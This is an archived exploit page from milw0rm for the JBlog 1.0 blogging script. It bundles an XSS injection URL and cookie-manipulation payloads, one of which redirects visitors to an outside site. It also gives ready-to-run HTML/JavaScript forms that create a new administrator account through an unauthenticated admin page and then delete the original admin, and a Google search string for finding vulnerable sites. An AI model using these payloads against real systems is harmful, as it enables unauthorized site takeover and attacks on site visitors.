<html><head><title>JBlog 1.0 Create / Delete Admin Authentication Bypass Exploit</title></head><pre>&lt;!--
##############################################################################
#	Script...............: JBlog version: 1.0                            #
#	Script Site..........: http://www.jmuller.net/jblog                  #
#	Vulnerability........: Creat Admin exploit, xss, Cookie Manipulation #
#	Access...............: Remote                                        #
#	level................: Dangerous                                     #
#	Author...............: S4mi                                          #
#	Contact..............: S4mi[at]LinuxMail.org                         #
#                                                                            #
##############################################################################

cookies Manipulation + Cross Site Scripting :
=========================================================================
xss:
----
http://site.com/jblog/index.php?id=&quot;&gt;[xss Here]&amp;pcomm=com 

cookies Manipulation:
--------------------
The POST variable 'search' in  /jblog/recherche.php  also The Cookie variable 'theme' is affected and can be set to :

 &lt;meta http-equiv='Set-cookie' content='name=value'&gt;

also we can do this :

 &lt;meta http-equiv='Set-cookie' content='theme=&lt;body+onload=alert(&quot;owned_by_Hacker&quot;)&gt;'&gt;

or :

&lt;meta http-equiv='Set-cookie' content='theme=&lt;body+onload=document.location=&quot;http://Bad.site.com/&quot;&gt;'&gt;

This is a small exemple of Inject Cookie Xploit (Cookie Manipulation)
---------------------------------------------------------------------------
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Inject Cookie Xploit By S4mi&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;script language=&quot;JavaScript&quot;&gt;
function JBlogxpl() 
{
  document.xploit.action=document.xploit.victim.value;
  document.xploit.submit();
 }
&lt;/script&gt;
&lt;form name=&quot;xploit&quot;  method=&quot;post&quot; action=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;victim&quot; value=&quot;http://victim/jblog/recherche.php&quot;&gt;
&lt;input type=&quot;hidden&quot;  name=&quot;search&quot; value=&quot;&amp;lt;meta http-equiv='Set-cookie' content='theme=&amp;lt;body+onload=document.location=&amp;quot;http://milw0rm.com/&amp;quot;&amp;gt;'&amp;gt;&quot; /&gt;
&lt;script&gt;document.location=&quot;javascript: JBlogxpl()&quot;&lt;/script&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;

============================================================================

Remote Privilege Escalation &quot;Creat New Admin Xploit&quot; By S4mi : 
============================================================================
--&gt;

&lt;html&gt;
&lt;title&gt;JBlog 1.0 -- Remote Privilege Escalation (Creat admin sploit) -- By S4mi&lt;/title&gt;
&lt;body&gt;
&lt;script language=&quot;JavaScript&quot;&gt;
function JBlogxpl() {
  if (document.xploit.victim.value==&quot;&quot;) {
    alert(&quot;Please enter target!&quot;);
    return false;
  }
 {
    xploit.action=&quot;http://&quot;+document.xploit.victim.value+&quot;admin/ajoutaut.php&quot;;
    xploit.mot.value=document.xploit.mot.value;
    xploit.droit.value=document.xploit.droit.value;
    xploit.submit();
  }
}

&lt;/script&gt;
&lt;strong&gt;&lt;p&gt;
-------------------------------------------------------------------------------------------&lt;br&gt;
  #JBlog 1.0 -- Remote Privilege Escalation Xploit (add user)&lt;br&gt;
  #	Discovered By...............: S4mi                                          &lt;br&gt;
  #	Contact..........................: S4mi[at]LinuxMail.org&lt;br&gt;
  #&lt;br&gt;
  #     Google Dork : &quot;propuls√© par JBlog&quot;  &lt;br&gt;
  --------------------------------------------------------------------------------------------&lt;/p&gt;
&lt;form name=&quot;xploit&quot; method=&quot;POST&quot; onSubmit=&quot;JBlogxpl();&quot;&gt;
  Target -&gt; Http://
    &lt;input type=&quot;text&quot; name=&quot;victim&quot; value=&quot;www.Site.com/Path/&quot; size=&quot;44&quot;&gt;
  &lt;p&gt; Username.......-&gt;
    &lt;input type=&quot;text&quot; name=&quot;mot&quot; value=&quot;ZaZ&quot; size=&quot;30&quot;&gt; 
    (your password will be by default: &lt;i&gt;&quot;admin&quot;&lt;/i&gt;)&lt;/p&gt;
  &lt;p&gt; User type......-&gt;
            &lt;select name=&quot;droit&quot;&gt;
                    &lt;option value=&quot;3&quot;&gt;Admin&lt;/option&gt;
                    &lt;option value=&quot;2&quot;&gt;Moderator&lt;/option&gt;
                    &lt;option value=&quot;1&quot;&gt;Editor&lt;/option&gt;
            &lt;/select&gt;
  &lt;/p&gt;
  &lt;p&gt;Submit...........-&gt;
    &lt;input name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;   Xploit it       &quot;&gt;
  &lt;/p&gt;
&lt;/form&gt;
&lt;br&gt;---------------------------------------------------------------------------------------&lt;br&gt;
  #NB : Remember do not  use a probably existing username (such as &quot;admin&quot;). &lt;br&gt;
  #If you want to Delete real admin account :D login into your New Created admin account &amp; use this :&lt;br&gt;
--------------------------------------------------------------------------------------------&lt;p&gt;
&lt;script language=&quot;JavaScript&quot;&gt;

function AdminDelete()
{ if (document.xploit.victim.value==&quot;&quot;) {
    alert(&quot;Please enter target!&quot;);
    return false;
  }
         if(confirm('Are you Sure!! want really DELETE user ?'))
	document.location.href=&quot;http://&quot;+document.xploit.victim.value+&quot;admin/supauteur.php?cat=&quot;+document.userdel.id.value;
}
&lt;/script&gt;
&lt;form name=&quot;userdel&quot; method=&quot;POST&quot; onSubmit=&quot;&quot;&gt;
ID...............&gt; &lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;1&quot; size=&quot;3&quot;&gt;
&lt;/form&gt;
&lt;a href=&quot;#&quot; OnClick=&quot;AdminDelete()&quot;/&gt;Delete&lt;/a&gt;

&lt;br&gt;-----------------------------------------------------------------------------------------------&lt;br&gt;
#Special Greetz to : Simo64, DrackaNz, Coder212, Iss4m, HarDose, r0_0t, ddx39, Black-Code, Nuck3r... &amp; all who know Me!

&lt;/body&gt;
&lt;/html&gt;

# milw0rm.com [2007-07-21]</pre></html>